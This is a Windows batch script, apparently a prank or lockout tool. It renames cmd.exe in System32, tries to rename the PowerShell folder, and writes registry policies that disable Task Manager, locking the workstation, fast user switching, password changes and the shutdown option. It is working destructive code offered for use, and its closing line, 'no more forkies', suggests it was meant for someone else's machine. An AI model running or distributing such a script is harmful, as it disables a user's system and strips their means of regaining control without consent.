@echo off
c:
cd \
cd windows
cd system32
ren cmd.exe test.exe
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" ^
 /v DisableTaskMgr /t REG_DWORD /d 1 /f
ren WindowsPowerShell Powershell
@echo off
echo Disabling Ctrl+Alt+Del options...

:: Disable Task Manager
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" ^
 /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" ^
 /v DisableLockWorkstation /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" ^
 /v HideFastUserSwitching /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" ^
 /v DisableChangePassword /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" ^
 /v NoClose /t REG_DWORD /d 1 /f
echo no more forkies
pause
@echo on
